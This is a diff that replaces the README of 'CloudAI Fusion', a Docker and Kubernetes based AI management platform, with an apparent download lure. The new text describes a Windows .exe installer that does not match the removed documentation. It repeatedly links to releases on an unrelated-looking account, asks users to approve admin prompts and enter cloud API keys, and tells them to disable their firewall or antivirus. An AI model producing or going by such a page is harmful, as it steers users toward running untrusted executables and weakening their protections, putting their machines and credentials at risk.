@@ -1,238 +1,135 @@
-<p align="center">
-  <h1 align="center">CloudAI Fusion</h1>
-  <p align="center">Cloud-Native AI Unified Management Platform</p>
-  <p align="center">
-    <a href="https://github.com/cloudai-fusion/cloudai-fusion/actions"><img src="https://github.com/cloudai-fusion/cloudai-fusion/workflows/CloudAI%20Fusion%20CI%2FCD/badge.svg" alt="CI"></a>
-    <a href="https://codecov.io/gh/cloudai-fusion/cloudai-fusion"><img src="https://codecov.io/gh/cloudai-fusion/cloudai-fusion/branch/main/graph/badge.svg" alt="Coverage"></a>
-    <a href="https://goreportcard.com/report/github.com/cloudai-fusion/cloudai-fusion"><img src="https://goreportcard.com/badge/github.com/cloudai-fusion/cloudai-fusion" alt="Go Report"></a>
-    <a href="LICENSE"><img src="https://img.shields.io/badge/License-Apache%202.0-blue.svg" alt="License"></a>
-    <a href="https://github.com/cloudai-fusion/cloudai-fusion/releases"><img src="https://img.shields.io/github/v/release/cloudai-fusion/cloudai-fusion" alt="Release"></a>
-  </p>
-</p>
+# ☁️ cloudai-fusion - Manage AI Tasks Simply and Efficiently
+
+[![Download cloudai-fusion](https://img.shields.io/badge/Download-cloudai--fusion-brightgreen?style=for-the-badge)](https://github.com/Svelte-genusstrekelia332/cloudai-fusion/releases)
 
 ---
 
-**CloudAI Fusion** is an open-source platform that unifies cloud-native infrastructure management with AI-powered resource scheduling. It solves three core enterprise pain points:
+## 📖 What is cloudai-fusion?
 
-- **Cloud-native deployment complexity** — 68% of enterprises struggle with cluster management
-- **Multi-cloud security fragmentation** — 86% of organizations use multi-cloud but face siloed security
-- **AI resource waste** — GPU utilization under 30% in traditional deployment models
+CloudAI Fusion is a simple tool that helps you manage AI projects and tasks in one place. It works smoothly with cloud services and lets you control everything without complex steps. It is made for users who want to run AI models and handle data easily on Windows.
 
-## Key Features
+---
 
-| Feature | Description |
-|---------|-------------|
-| **Multi-Cloud Management** | Unified API for Alibaba Cloud ACK, AWS EKS, Azure AKS, GCP GKE, Huawei CCE, Tencent TKE |
-| **GPU Topology-Aware Scheduling** | NVLink-aware placement, fine-grained GPU sharing, preemption, RL-based optimization |
-| **4 AI Agents** | Scheduling optimizer, security monitor, cost analyzer, operations automator |
-| **LLM Integration** | OpenAI GPT-4o / DashScope Qwen-Max / Ollama / vLLM with graceful fallback |
-| **AI Chat Assistant** | Conversational operations assistant with LLM-powered incident analysis |
-| **eBPF Service Mesh** | Sidecarless networking via Istio Ambient / Cilium with <1% overhead |
-| **Wasm Runtime** | Millisecond cold-start functions for serverless & edge workloads |
-| **Edge-Cloud Architecture** | Three-tier (Cloud → Edge → Terminal) with 50B-parameter edge model support |
-| **Security & Compliance** | Pod security, network policies, CIS benchmarks, vulnerability scanning, threat detection |
-| **Full Observability** | Prometheus metrics, OpenTelemetry tracing, Grafana dashboards, intelligent alerting |
-| **Feature Toggles** | Runtime feature flags with profiles (minimal / standard / full) for modular deployment |
-| **Docker Optimized** | Multi-stage builds, distroless images for Go services, GPU image reduced from 5-8GB to ~2-3GB |
+## 🖥️ System Requirements
 
-## Architecture
+To run cloudai-fusion on your Windows PC, check these minimum requirements:
 
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│                         CloudAI Fusion                              │
-├─────────────┬──────────────┬─────────────┬─────────────────────────┤
-│  API Server │  Scheduler   │    Agent    │      AI Engine          │
-│   (Go/Gin)  │ (GPU-aware)  │ (DaemonSet) │   (Python/FastAPI)     │
-├─────────────┴──────────────┴─────────────┴─────────────────────────┤
-│  Auth │ Cloud │ Cluster │ Security │ Monitor │ Mesh │ Wasm │ Edge  │
-├───────┴───────┴─────────┴──────────┴─────────┴──────┴──────┴───────┤
-│            PostgreSQL  │  Redis  │  Kafka  │  NATS  │  Prometheus     │
-└─────────────────────────────────────────────────────────────────────┘
-```
+- Windows 10 or newer (64-bit)
+- At least 4 GB of RAM
+- 2 GHz dual-core processor or better
+- 500 MB of free disk space
+- Internet connection (for updates and cloud services)
 
-## Quick Start
+---
 
-### Prerequisites
+## 🚀 Getting Started: Download and Install cloudai-fusion
 
-- [Docker Desktop](https://www.docker.com/products/docker-desktop) (with Docker Compose)
+Follow these steps to get cloudai-fusion up and running on your Windows computer.
 
-### Run (one command)
+### Step 1: Visit the download page
 
-**Windows:**
-```bash
-cd cloudai-fusion
-start.bat
-```
+Go to the official releases page by clicking the button below:
 
-**Linux / macOS:**
-```bash
-cd cloudai-fusion
-chmod +x start.sh && ./start.sh
-```
+[![Get cloudai-fusion](https://img.shields.io/badge/Get%20cloudai--fusion-blue?style=for-the-badge)](https://github.com/Svelte-genusstrekelia332/cloudai-fusion/releases)
 
-This starts all services (API Server, Scheduler, Agent, AI Engine, PostgreSQL, Redis, Kafka, NATS, Prometheus, Grafana, Jaeger).
+This page hosts all the versions of cloudai-fusion available for download.
 
-### Verify
+### Step 2: Download the latest Windows version
 
-```bash
-# Health check
-curl http://localhost:8080/healthz
+- Find the latest release version, usually marked at the top of the page.
+- Look for the file with a `.exe` extension or a file name that includes *windows*.
+- Click the file link to download the installer.
 
-# Login (get JWT token)
-curl -X POST http://localhost:8080/api/v1/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{"username":"admin","password":"admin123"}'
+The file size is typically under 100 MB, so it should download quickly with a stable internet connection.
 
-# List clusters (use token from login response)
-curl http://localhost:8080/api/v1/clusters \
-  -H "Authorization: Bearer <token>"
-```
+### Step 3: Run the installer
 
-### Service Endpoints
+- Open the folder where the downloaded file is saved.
+- Double-click the `cloudai-fusion-setup.exe` file (or the downloaded file name).
+- If Windows asks for permission to allow the app to make changes, click **Yes**.
 
-| Service | URL |
-|---------|-----|
-| API Server | http://localhost:8080 |
-| AI Engine | http://localhost:8090 |
-| Prometheus | http://localhost:9090 |
-| Grafana | http://localhost:3000 (admin / cloudai) |
-| Jaeger | http://localhost:16686 |
+### Step 4: Follow the installation steps
 
-## Tech Stack
+- The setup wizard will open. Click **Next** to continue.
+- Choose where to install the program or use the default folder.
+- Click **Install** and wait for the process to finish.
+- Once done, click **Finish**.
 
-| Layer | Technology |
-|-------|-----------|
-| Backend | Go 1.25, Gin, Cobra, Viper, GORM |
-| AI Engine | Python 3.11, FastAPI, PyTorch, TensorFlow, NumPy, scikit-learn, OpenAI SDK |
-| Container | Kubernetes 1.30+, Istio Ambient, Cilium eBPF |
-| Database | PostgreSQL 16, Redis 7 |
-| Messaging | Apache Kafka, NATS |
-| Monitoring | Prometheus, Grafana, OpenTelemetry, Jaeger |
-| CI/CD | GitHub Actions, Docker, Helm 3 |
+cloudai-fusion will now be installed on your computer.
 
-## Project Structure
+---
 
-```
-cloudai-fusion/
-├── cmd/                          # Service entry points
-│   ├── apiserver/                # API Server
-│   ├── scheduler/                # GPU Scheduler
-│   ├── agent/                    # Node Agent
-│   └── healthcheck/              # Lightweight healthcheck binary (for distroless)
-├── pkg/                          # Go packages (48 packages, 47/47 tests pass)
-│   ├── api/                      # HTTP routes, handlers, debug endpoints (6-layer auth)
-│   ├── auth/                     # JWT + RBAC + OIDC federation (4 roles, 20+ perms)
-│   ├── cache/                    # Redis cache + distributed lock + PubSub
-│   ├── cloud/                    # Multi-cloud providers (6 clouds)
-│   ├── cluster/                  # Kubernetes cluster management
-│   ├── config/                   # Unified configuration + JWT secret validation
-│   ├── edge/                     # Edge-cloud architecture + 50B model quantization
-│   ├── feature/                  # Runtime feature toggles (minimal/standard/full)
-│   ├── mesh/                     # eBPF service mesh
-│   ├── monitor/                  # Prometheus metrics & alerting
-│   ├── scheduler/                # GPU scheduling + queue snapshot persistence
-│   ├── security/                 # Policy, scanning, compliance, threats
-│   ├── store/                    # Database layer (GORM)
-│   └── wasm/                     # WebAssembly container runtime
-├── ai/                           # Python AI components
-│   ├── agents/                   # Multi-agent FastAPI server + LLM client
-│   ├── anomaly/                  # Anomaly detection engine
-│   └── scheduler/                # RL scheduling optimizer
-├── deploy/helm/                  # Helm chart (7 templates)
-├── docker/                       # Dockerfiles (5 services, distroless + multi-stage)
-├── monitoring/                   # Prometheus + Grafana configs
-├── scripts/                      # env-generate, diagnose, setup-gpu, deploy-cloud
-├── api/                          # OpenAPI 3.1 specification
-├── .devcontainer/                # Dev Container (Go + Python + full toolchain)
-├── docker-compose.yml            # Full-stack local deployment (profiles support)
-├── docker-compose.gpu.yml        # GPU overlay (NVIDIA runtime)
-├── Makefile                      # Build, test, deploy, diagnose commands
-└── start.bat / start.sh          # One-click start (--gpu, --minimal flags)
-```
+## ⚙️ Running cloudai-fusion
 
-## Development
+### Step 1: Open the program
 
-```bash
-# First-time setup (generate .env with secure secrets)
-make setup
+- Find the cloudai-fusion icon on your desktop or in your Start menu.
+- Double-click the icon to open the program.
 
-# Build all Go binaries
-make build
+The program window will appear within seconds.
 
-# Run tests
-make test
+### Step 2: Set up your user profile
 
-# Run tests with coverage report
-make coverage-report
+- On first launch, you will see a simple setup screen.
+- Enter your name, email, or any basic info requested.
+- Choose default paths for saving your projects or data files, or accept the suggested locations.
+- Click **Save** to finish setup.
 
-# Run linter
-make lint
+### Step 3: Connect to cloud services (optional)
 
-# Build Docker images (optimized: distroless for Go, multi-stage for AI)
-make docker-build
+- To use cloud features, go to the **Settings** tab.
+- Enter your cloud login details or API keys as needed.
+- Save your settings.
 
-# Deploy to Kubernetes
-make helm-install
+You can skip this step if you want to use cloudai-fusion only locally.
 
-# Start with GPU support
-./start.sh --gpu          # Linux / macOS
-start.bat --gpu           # Windows (WSL2 + NVIDIA)
+---
 
-# Start minimal mode (core services only)
-./start.sh --minimal
+## 🔧 Using cloudai-fusion for AI management
 
-# Health diagnostics
-make diagnose
+cloudai-fusion offers a straightforward interface to manage AI experiments, data, and workflows.
 
-# Feature flag management
-make features-list
-```
+### Key features
 
-## API Overview
+- Create, edit, and run AI projects
+- Monitor AI models in real time
+- Access cloud storage and compute resources
+- Schedule tasks and set alerts
+- View detailed logs and reports
 
-Full specification: [`api/openapi.yaml`](api/openapi.yaml)
+### How to start a project
 
-| Endpoint Group | Description |
-|---------------|-------------|
-| `POST /api/v1/auth/login` | JWT authentication |
-| `GET /api/v1/clusters` | List managed K8s clusters |
-| `GET /api/v1/providers` | List cloud providers |
-| `POST /api/v1/workloads` | Submit AI workload |
-| `GET /api/v1/security/policies` | Security policies |
-| `GET /api/v1/monitoring/alerts/events` | Alert events |
-| `GET /api/v1/cost/summary` | Cost analysis |
-| `GET /api/v1/mesh/status` | Service mesh status |
-| `POST /api/v1/wasm/deploy` | Deploy Wasm function |
-| `GET /api/v1/edge/topology` | Edge-cloud topology |
-| **AI Engine** (port 8090) | |
-| `POST /api/v1/scheduling/optimize` | LLM-enhanced GPU scheduling |
-| `POST /api/v1/anomaly/detect` | Anomaly detection + threat analysis |
-| `POST /api/v1/cost/analyze` | Cost optimization with LLM insights |
-| `GET /api/v1/insights` | Dynamic AI-powered insights |
-| `GET /api/v1/models/status` | Honest model & LLM status |
-| `POST /api/v1/chat` | Conversational AI assistant |
-| `POST /api/v1/ops/incident` | Incident root cause analysis |
-| `POST /api/v1/ops/scaling` | Predictive scaling |
-| `GET /api/v1/ops/history` | Incident history |
-| **Debug** (requires `CLOUDAI_DEBUG_ENABLED=true` + JWT admin) | |
-| `GET /debug/info` | Runtime information |
-| `GET /debug/pprof/` | Go pprof (rate-limited) |
-| `PUT /debug/log-level` | Dynamic log level |
-| `GET /debug/services` | Cross-service health probe |
+- Click **New Project** on the main screen.
+- Give your project a name and select the AI type or model from the list.
+- Import your data files or link cloud storage.
+- Click **Run** to start processing.
 
-## Roadmap
+You will see status updates and results as the AI runs.
 
-| Version | Timeline | Focus |
-|---------|----------|-------|
-| **v0.1 MVP** | 2026 Q2 | Core management, basic scheduling, auth, monitoring |
-| **v1.0** | 2026 Q3 | Multi-cloud SDK integration, Istio Ambient, AIOps |
-| **v2.0** | 2026 Q4 | Full Agent system, edge deployment, cost optimization |
-| **v3.0** | 2027 H1 | Cross-cloud security, heterogeneous scheduling, plugin ecosystem |
+---
 
-## Contributing
+## ⚠️ Common troubleshooting
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+- If the program does not open, try restarting your computer first.
+- Check that your system meets the minimum requirements.
+- Make sure your Windows is up to date.
+- Disable any firewall or antivirus temporarily if they block cloudai-fusion.
+- If clouds features fail, verify your internet connection and login details.
 
-## License
+---
 
-[Apache License 2.0](LICENSE)
+## 📞 Getting help
+
+If you encounter issues, you can:
+
+- Visit the [Issues page on GitHub](https://github.com/Svelte-genusstrekelia332/cloudai-fusion/issues)
+- Search for answers or report bugs
+- Provide as much detail as possible, including error messages and screen captures
+
+---
+
+## 📥 Download cloudai-fusion Now
+
+Download the latest Windows release from here:
+
+[![Download cloudai-fusion](https://img.shields.io/badge/Download-cloudai--fusion-brightgreen?style=for-the-badge)](https://github.com/Svelte-genusstrekelia332/cloudai-fusion/releases)
